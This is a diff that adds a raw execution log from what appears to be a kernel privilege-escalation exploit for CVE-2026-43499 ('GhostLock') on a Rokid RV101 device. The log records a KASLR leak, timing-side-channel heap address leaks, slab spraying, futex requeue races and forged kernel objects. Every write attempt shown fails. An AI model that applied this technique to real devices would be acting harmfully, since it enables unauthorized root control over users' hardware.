@@ -1,0 +1,289 @@
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3087 uid=2000 euid=2000 gid=2000
+[*] [T+401635ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffe478c2ac0c slide=0x000000246f000000
+[*] printk_formats: "Function call interrupts" -> 0xffffffe478cca100 slide=0x000000246f000000
+[+] KASLR: slide=0x000000246f000000 base=0xffffffe477000000 (2 anchors)
+[*] selftest run 1/3
+[*] === SELFTEST: write into sprayed page === target=0x0000000000000000 mode=3 delta=+0
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*]   collision[1]: 000000612707fda0 (t=8732, ratio=1746)
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[2]: 00000061272b1f30 (t=8857, ratio=1771)
+[*]   collision[3]: 0000006127882db8 (t=9109, ratio=1821)
+[*] kernelsnitch: top times: 9109 8857 8732 9 8 7 7 7
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10252 mm=FOUND
+[*] kernelsnitch: elapsed 2224ms mm=ffffff8028b27c00
+[*] leaked mm=ffffff8028b27c00 slab base=ffffff8028b24000
+[*] v9.14 settle[settle]: 61 rounds, o2=1161 objs=850 (quiet=5)
+[*] v9.10 gate: mm slabs 126 -> 125 objs 850 -> 728 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 0 -> 2549 across full sequence (gate window 126 -> 2549, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8028b25300 value=ffffff8028b25500 mode=3 page=ffffff8028b24000 fake_lock=ffffff8028b24e00 fake_w0=ffffff8028b25000 fake_task=ffffff8028b25200 in=0000000000000000 out1=ffffff8028b252f9 out2=ffffff8028b25500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8028b25200 ex3=ffffff8028b24e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=9762
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=9762
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=9762
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=9762
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=9762
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 1/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[1]: 0000006124945da0 (t=9028, ratio=1805)
+[*]   collision[2]: 0000006124e4e5e8 (t=8775, ratio=1755)
+[*]   collision[3]: 0000006124e8f7f0 (t=9080, ratio=1816)
+[*] kernelsnitch: top times: 9080 9028 8775 9 9 8 8 7
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11125 mm=FOUND
+[*] kernelsnitch: elapsed 2232ms mm=ffffff8029054000
+[*] leaked mm=ffffff8029054000 slab base=ffffff8029054000
+[*] v9.14 settle[settle]: 61 rounds, o2=2696 objs=967 (quiet=8)
+[*] v9.10 gate: mm slabs 130 -> 130 objs 967 -> 800 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 74 -> 3264 across full sequence (gate window 130 -> 3264, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8029055300 value=ffffff8029055500 mode=3 page=ffffff8029054000 fake_lock=ffffff8029054e00 fake_w0=ffffff8029055000 fake_task=ffffff8029055200 in=0000000000000000 out1=ffffff80290552f9 out2=ffffff8029055500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8029055200 ex3=ffffff8029054e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=15826
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=15826
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=15826
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=15826
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=15826
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 2/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[1]: 0000006122a505f8 (t=9215, ratio=1843)
+[*]   collision[2]: 0000006122b4dde0 (t=9316, ratio=1863)
+[*]   collision[3]: 0000006122c0c3d8 (t=9157, ratio=1831)
+[*] kernelsnitch: top times: 9316 9215 9157 7 7 7 7 7
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10919 mm=FOUND
+[*] kernelsnitch: elapsed 1576ms mm=ffffff8029055680
+[*] leaked mm=ffffff8029055680 slab base=ffffff8029054000
+[*] v9.14 settle[settle]: 61 rounds, o2=2430 objs=1023 (quiet=18)
+[*] v9.10 gate: mm slabs 132 -> 132 objs 1023 -> 841 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 35 -> 3472 across full sequence (gate window 132 -> 3472, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8029055300 value=ffffff8029055500 mode=3 page=ffffff8029054000 fake_lock=ffffff8029054e00 fake_w0=ffffff8029055000 fake_task=ffffff8029055200 in=0000000000000000 out1=ffffff80290552f9 out2=ffffff8029055500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8029055200 ex3=ffffff8029054e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=21890
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=21890
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=21890
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=21890
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=21890
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 3/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[1]: 0000006121d22c88 (t=9222, ratio=1844)
+[*]   collision[2]: 0000006123a38538 (t=9204, ratio=1840)
+[*]   collision[3]: 00000061249a0078 (t=9219, ratio=1843)
+[*] kernelsnitch: top times: 9222 9219 9204 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=9299 mm=FOUND
+[*] kernelsnitch: elapsed 4237ms mm=ffffff80060d52c0
+[*] leaked mm=ffffff80060d52c0 slab base=ffffff80060d4000
+[*] v9.14 settle[settle]: 24 rounds, o2=2607 objs=1055 (quiet=20)
+[*] v9.10 gate: mm slabs 134 -> 134 objs 1055 -> 874 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 74 -> 3313 across full sequence (gate window 134 -> 3313, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff80060d5300 value=ffffff80060d5500 mode=3 page=ffffff80060d4000 fake_lock=ffffff80060d4e00 fake_w0=ffffff80060d5000 fake_task=ffffff80060d5200 in=0000000000000000 out1=ffffff80060d52f9 out2=ffffff80060d5500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff80060d5200 ex3=ffffff80060d4e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=27954
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=27954
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=27954
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=27954
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=27954
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 4/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*]   collision[1]: 00000061207f3310 (t=9266, ratio=1853)
+[*]   collision[2]: 00000061208feb68 (t=9021, ratio=1804)
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[3]: 0000006120e6b6d0 (t=9312, ratio=1862)
+[*] kernelsnitch: top times: 9312 9266 9021 9 9 8 7 7
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=13252 mm=FOUND
+[*] kernelsnitch: elapsed 1930ms mm=ffffff801aeb5a40
+[*] leaked mm=ffffff801aeb5a40 slab base=ffffff801aeb4000
+[*] v9.14 settle[settle]: 35 rounds, o2=2617 objs=1158 (quiet=20)
+[*] v9.10 gate: mm slabs 138 -> 138 objs 1158 -> 921 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 210 -> 3631 across full sequence (gate window 138 -> 3631, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff801aeb5300 value=ffffff801aeb5500 mode=3 page=ffffff801aeb4000 fake_lock=ffffff801aeb4e00 fake_w0=ffffff801aeb5000 fake_task=ffffff801aeb5200 in=0000000000000000 out1=ffffff801aeb52f9 out2=ffffff801aeb5500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff801aeb5200 ex3=ffffff801aeb4e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=2589
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=2589
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=2589
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=2589
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=2589
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 5/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[1]: 0000006120d1fc70 (t=9240, ratio=1848)
+[*]   collision[2]: 0000006120da60a8 (t=9165, ratio=1833)
+[*]   collision[3]: 00000061211d2208 (t=9234, ratio=1846)
+[*] kernelsnitch: top times: 9240 9234 9165 9 9 9 9 9
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=9373 mm=FOUND
+[*] kernelsnitch: elapsed 2896ms mm=ffffff804112d2c0
+[*] leaked mm=ffffff804112d2c0 slab base=ffffff804112c000
+[*] v9.14 settle[settle]: 26 rounds, o2=2731 objs=1033 (quiet=20)
+[*] v9.10 gate: mm slabs 141 -> 141 objs 1033 -> 987 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 1 -> 3570 across full sequence (gate window 141 -> 3570, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff804112d300 value=ffffff804112d500 mode=3 page=ffffff804112c000 fake_lock=ffffff804112ce00 fake_w0=ffffff804112d000 fake_task=ffffff804112d200 in=0000000000000000 out1=ffffff804112d2f9 out2=ffffff804112d500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff804112d200 ex3=ffffff804112ce00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=8734
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=8734
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=8734
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=8734
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=8734
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 6/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[!]   SELFTEST: write into sprayed page failed after 6 attempts
+[*] selftest run 1/3 done (hit=0)  [0/1 hits so far]
+[*] selftest run 2/3
+[*] === SELFTEST: write into sprayed page === target=0x0000000000000000 mode=3 delta=+0
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[1]: 000000611eb2acc8 (t=9427, ratio=1885)
+[*]   collision[2]: 000000611f1b2108 (t=9453, ratio=1890)
+[*]   collision[3]: 000000611f4877b0 (t=9485, ratio=1897)
+[*] kernelsnitch: top times: 9485 9453 9427 9 9 9 9 8
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11515 mm=FOUND
+[*] kernelsnitch: elapsed 2227ms mm=ffffff8034c71a40
+[*] leaked mm=ffffff8034c71a40 slab base=ffffff8034c70000
+[*] v9.14 settle[settle]: 43 rounds, o2=3000 objs=1182 (quiet=20)
+[*] v9.10 gate: mm slabs 146 -> 146 objs 1182 -> 1065 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 0 -> 3946 across full sequence (gate window 146 -> 3946, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff8034c71300 value=ffffff8034c71500 mode=3 page=ffffff8034c70000 fake_lock=ffffff8034c70e00 fake_w0=ffffff8034c71000 fake_task=ffffff8034c71200 in=0000000000000000 out1=ffffff8034c712f9 out2=ffffff8034c71500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff8034c71200 ex3=ffffff8034c70e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=14805
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=14805
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=14805
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=14805
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=14805
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] cleanup: 0 vehicle(s) with diffs, 0 with STRICT signature
+[-]   attempt 1/6: strict walk signature not observed (payload not in place or walk missed), retrying
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0
+Threads:	4097
+[*]   collision[1]: 000000611d912c08 (t=8954, ratio=1790)
+[*] v9.15 diag: purge clones ok=700 fail=0
+[*]   collision[2]: 000000611dc00378 (t=9089, ratio=1817)
+[*]   collision[3]: 000000611e8f8b38 (t=9080, ratio=1816)
+[*] kernelsnitch: top times: 9089 9080 8954 9 9 9 9 8
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=10315 mm=FOUND
+[*] kernelsnitch: elapsed 2471ms mm=ffffff80060d4000
+[*] leaked mm=ffffff80060d4000 slab base=ffffff80060d4000
+[*] v9.14 settle[settle]: 31 rounds, o2=2898 objs=1287 (quiet=20)
+[*] v9.10 gate: mm slabs 150 -> 150 objs 1287 -> 1147 (dip=0 calm=364)
+[*] v9.12 reclaim: o2 84 -> 4044 across full sequence (gate window 150 -> 4044, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
